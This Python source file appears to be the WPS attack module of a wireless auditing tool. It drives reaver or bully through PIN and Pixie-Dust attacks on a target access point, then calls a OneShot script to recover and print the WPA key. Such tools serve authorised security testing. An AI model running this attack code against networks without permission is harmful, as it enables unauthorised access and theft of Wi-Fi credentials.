#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import re
import time
import subprocess

from ..model.attack import Attack
from ..util.color import Color
from ..util.logger import log_info, log_debug, log_warning, log_error
from ..config import Configuration
from ..util.output import OutputManager
from ..tools.bully import Bully
from ..tools.reaver import Reaver
from ..model.wps_result import CrackResultWPS


class AttackWPS(Attack):
    @staticmethod
    def can_attack_wps():
        return Reaver.exists() or Bully.exists()

    def __init__(self, target, pixie_dust=False, null_pin=False):
        super(AttackWPS, self).__init__(target)
        self.success = False
        self.crack_result = None
        self.pixie_dust = pixie_dust
        self.null_pin = null_pin
        
        # Initialize TUI view if in TUI mode
        self.view = None
        if OutputManager.is_tui_mode():
            try:
                from ..ui.attack_view import WPSAttackView
                self.view = WPSAttackView(OutputManager.get_controller(), target)
                if pixie_dust:
                    self.view.set_pixie_dust_mode(True)
            except Exception:
                # If TUI initialization fails, continue without it
                self.view = None

    def run(self):
        """ Run all WPS-related attacks """

        mode = 'pixie-dust' if self.pixie_dust else ('null-pin' if self.null_pin else 'pin')
        log_info('AttackWPS', 'Starting WPS %s attack on %s (%s)' % (
            mode, self.target.essid or '?', self.target.bssid))
        self._attack_start = time.time()

        # Start TUI view if available
        if self.view:
            self.view.start()
            self.view.set_attack_type("WPS Attack")

        # Drop out if user specified to not use Reaver/Bully
        if Configuration.use_pmkid_only:
            self.success = False
            return False

        if Configuration.no_wps:
            self.success = False
            return False

        if not Configuration.wps_pixie and self.pixie_dust:
            return self._handle_wps_skip(
                '\r{!} {O}--no-pixie{R} was given, ignoring WPS Pixie-Dust Attack on {O}%s{W}'
            )
        if not Configuration.wps_no_nullpin and self.null_pin:
            #Color.pl('\r{!} {O}--no-nullpin{R} was given, ignoring WPS NULLPIN Attack on {O}%s{W}' % self.target.essid)
            self.success = False
            return False

        if not Configuration.wps_pin and not self.pixie_dust:
            return self._handle_wps_skip(
                '\r{!} {O}--pixie{R} was given, ignoring WPS PIN Attack on {O}%s{W}'
            )
        
        # Cache pixie-dust support check to avoid duplicate reaver -h calls
        reaver_supports_pixie = Reaver.is_pixiedust_supported() if self.pixie_dust else True
        
        if not Reaver.exists() and Bully.exists():
            # Use bully if reaver isn't available
            return self.run_bully()
        elif self.pixie_dust and not reaver_supports_pixie and Bully.exists():
            # Use bully if reaver can't do pixie-dust
            return self.run_bully()
        elif Configuration.use_bully:
            # Use bully if asked by user
            return self.run_bully()
        elif not Reaver.exists():
            # Print error if reaver isn't found (bully not available)
            if self.pixie_dust:
                Color.pl('\r{!} {R}Skipping WPS Pixie-Dust attack: {O}reaver{R} not found.{W}')
            else:
                Color.pl('\r{!} {R}Skipping WPS PIN attack: {O}reaver{R} not found.{W}')
            return False
        elif self.pixie_dust and not reaver_supports_pixie:
            # Print error if reaver can't support pixie-dust (bully not available)
            Color.pl('\r{!} {R}Skipping WPS attack: {O}reaver{R} does not support {O}--pixie-dust{W}')
            return False
        else:
            return self.run_reaver()

    def _handle_wps_skip(self, message):
        Color.pl(message % self.target.essid)
        self.success = False
        return False

    def try_oneshot_with_pin(self, pin):
        """
        Intenta obtener la PSK usando OneShot con el PIN WPS completo.
        Se llama cuando se obtiene el PIN pero no la PSK.
        Retorna CrackResultWPS con PSK si tiene éxito, None si falla.
        """
        if not pin:
            return None

        # Ruta al script oneshot
        oneshot_path = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
                                    '..', 'OneShot', 'oneshot.py')

        if not os.path.exists(oneshot_path):
            log_warning('OneShot', f'oneshot.py not found at {oneshot_path}')
            return None

        Color.pl('{!} {O}PSK not found, trying OneShot with PIN {C}%s{W}...' % pin)
        if self.view:
            self.view.add_log(f"PSK not found, attempting to obtain it with OneShot...")
            self.view.set_attack_type("WPS PIN Recovery (OneShot)")

        log_info('OneShot', f'Attempting to get PSK with PIN: {pin}')

        try:
            # Construir comando oneshot con PIN completo
            oneshot_cmd = [
                'python3',
                oneshot_path,
                '-i', Configuration.interface,
                '-b', self.target.bssid,
                '-p', pin  # PIN completo
            ]

            if self.view:
                self.view.add_log(f"Executing: {' '.join(oneshot_cmd)}")

            # Crear archivo temporal para output
            oneshot_output_file = Configuration.temp('oneshot_pin.out')

            with open(oneshot_output_file, 'w') as output_file:
                # Ejecutar oneshot
                oneshot_proc = subprocess.Popen(
                    oneshot_cmd,
                    stdout=output_file,
                    stderr=subprocess.STDOUT,
                    universal_newlines=True
                )

                # Monitorear el proceso
                last_update_time = time.time()
                while oneshot_proc.poll() is None:
                    time.sleep(1)

                    # Actualizar UI cada 5 segundos
                    if time.time() - last_update_time > 5:
                        Color.p('.')
                        last_update_time = time.time()

                Color.pl('')  # Nueva línea después de los puntos

                # Proceso terminó, leer output
                with open(oneshot_output_file, 'r') as f:
                    oneshot_output = f.read()

                if Configuration.verbose > 1:
                    Color.pe('\n{P} [oneshot:stdout] %s' % '\n [oneshot:stdout] '.join(oneshot_output.split('\n')))

                # Parsear resultado de oneshot
                psk_match = re.search(r"\[.\]\s*WPA PSK:\s*['\"](.+?)['\"]", oneshot_output)
                ssid_match = re.search(r"\[.\]\s*AP SSID:\s*['\"](.+?)['\"]", oneshot_output)

                if psk_match:
                    psk = psk_match.group(1)
                    ssid = ssid_match.group(1) if ssid_match else self.target.essid

                    Color.pl('{+} {G}OneShot Success! PSK: {C}%s{W}' % psk)

                    if self.view:
                        self.view.add_log(f"SUCCESS! PSK obtained: {psk}")
                        from ..util.logger import mask_sensitive
                        self.view.update_progress({
                            'progress': 1.0,
                            'status': 'PSK obtained with OneShot!',
                            'metrics': {
                                'PIN': pin,
                                'PSK': mask_sensitive(psk),
                                'Status': 'SUCCESS',
                                'Method': 'OneShot'
                            }
                        })

                    log_info('OneShot', f'Successfully obtained PSK with PIN: {pin}')

                    # Crear resultado completo
                    crack_result = CrackResultWPS(self.target.bssid, ssid, pin, psk)
                    return crack_result
                else:
                    # OneShot falló
                    Color.pl('{!} {O}OneShot failed to get PSK with PIN{W}')

                    if self.view:
                        self.view.add_log("OneShot failed to obtain PSK")

                    log_warning('OneShot', 'Failed to obtain PSK with PIN')
                    return None

        except Exception as e:
            Color.pl('{!} {R}OneShot error: {O}%s{W}' % str(e))

            if self.view:
                self.view.add_log(f"OneShot error: {str(e)}")

            log_error('OneShot', f'Error: {str(e)}')
            return None
        finally:
            # Limpiar archivo temporal
            if os.path.exists(oneshot_output_file):
                try:
                    os.remove(oneshot_output_file)
                except:
                    pass

    def run_bully(self):
        log_debug('AttackWPS', 'Using bully for WPS attack')
        bully = Bully(self.target, pixie_dust=self.pixie_dust)
        # Pass the view to bully for TUI updates
        if self.view:
            bully.attack_view = self.view
        bully.run()
        bully.stop()
        self.crack_result = bully.crack_result

        # Si tenemos PIN pero no PSK, intentar con OneShot
        if self.crack_result and self.crack_result.pin and not self.crack_result.psk:
            log_info('AttackWPS', 'PIN found but no PSK, trying OneShot...')
            oneshot_result = self.try_oneshot_with_pin(self.crack_result.pin)
            if oneshot_result and oneshot_result.psk:
                # OneShot obtuvo la PSK, actualizar resultado
                self.crack_result = oneshot_result

        self.success = self.crack_result is not None
        log_info('AttackWPS', 'WPS bully attack on %s finished in %.1fs — %s' % (
            self.target.bssid, time.time() - getattr(self, '_attack_start', time.time()),
            'SUCCESS' if self.success else 'no pin'))
        return self.success

    def run_reaver(self):
        log_debug('AttackWPS', 'Using reaver for WPS attack')
        reaver = Reaver(self.target, pixie_dust=self.pixie_dust, null_pin=self.null_pin)
        # Pass the view to reaver for TUI updates
        if self.view:
            reaver.attack_view = self.view
        reaver.run()
        self.crack_result = reaver.crack_result

        # Si tenemos PIN pero no PSK, intentar con OneShot
        if self.crack_result and self.crack_result.pin and not self.crack_result.psk:
            log_info('AttackWPS', 'PIN found but no PSK, trying OneShot...')
            oneshot_result = self.try_oneshot_with_pin(self.crack_result.pin)
            if oneshot_result and oneshot_result.psk:
                # OneShot obtuvo la PSK, actualizar resultado
                self.crack_result = oneshot_result

        self.success = self.crack_result is not None
        log_info('AttackWPS', 'WPS reaver attack on %s finished in %.1fs — %s' % (
            self.target.bssid, time.time() - getattr(self, '_attack_start', time.time()),
            'SUCCESS' if self.success else 'no pin'))
        return self.success
